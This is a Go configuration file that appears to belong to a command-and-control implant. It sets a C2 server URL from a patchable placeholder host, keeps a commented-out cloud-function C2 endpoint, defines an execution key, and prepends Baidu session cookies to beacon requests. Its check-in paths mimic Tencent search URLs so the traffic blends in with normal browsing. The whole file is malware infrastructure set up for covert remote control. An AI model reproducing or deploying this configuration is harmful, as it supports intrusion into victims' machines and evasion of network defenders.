package config

import (
	"strings"
	"time"
)

var (
	//C2 = "https://gin-tne-fahcesmukw.cn-hangzhou.fcapp.run"
	//C2 = "http://***.***.***.***:************************************************"
	host = "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	C2   = "http://" + strings.ReplaceAll(host, " ", "")
	//C2                        = "http://127.0.0.1:8080"
	pass                      = "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	ExecuteKey                = strings.ReplaceAll(pass, " ", "")
	Http_get_metadata_prepend = "BDUSS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS; BDUSS_BFESS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS;SESSIONID=" // 每个http get 请求发送的数据前添加的字符串

	Http_post_client_output_type_value = "X-AUTH"

	GetUrl  = strings.TrimRight(C2, " ") + Http_get_uri
	PostUrl = strings.TrimRight(C2, " ") + Http_post_uri

	Http_get_uri  = "/tencent/mcp/pc/pcsearch"
	Http_post_uri = "/tencent/sensearch/collection/item/check"

	WaitTime = 5000 * time.Millisecond
)
